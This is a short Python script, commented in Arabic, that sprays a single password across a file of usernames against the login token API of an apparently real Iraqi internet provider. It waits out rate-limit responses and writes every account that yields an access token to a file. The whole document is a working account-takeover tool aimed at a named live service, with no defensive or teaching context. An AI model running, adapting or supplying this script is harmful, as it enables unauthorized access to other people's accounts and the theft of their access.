import requests
import time
import os

u = input("Enter User for attack: ")
listpas = input("Enter password list: ")
userLIST = []
usernameLIST = []
passinpot = open(u, 'r').readlines()

output_file = open("output.txt", "w")  # اسم الملف النصي الذي ستتم كتابة القيم فيه

for line in passinpot:
    a = line.strip()

    data = {
        'grant_type': 'password',
        'username': a,
        'password': listpas,
        'Logintype': '0'
    }

    http = requests.post('https://ubapi.earthlink.iq/api/user/Token', data=data)

    print(http.text)
    print(a)
    if 'Too many !' in http.text:
        print("loading ... .>>>^^^^^^")
        time.sleep(100)
        print(a)
    if 'access_token' in http.text:
        os.system("clear")
        userLIST.append(a)
        print("USER FUONDD  ", userLIST, "and PASS", "[", listpas, "]")
        output_file.write(a + "\n")  # كتابة القيمة في الملف النصي

output_file.close()  # إغلاق الملف بعد الانتهاء
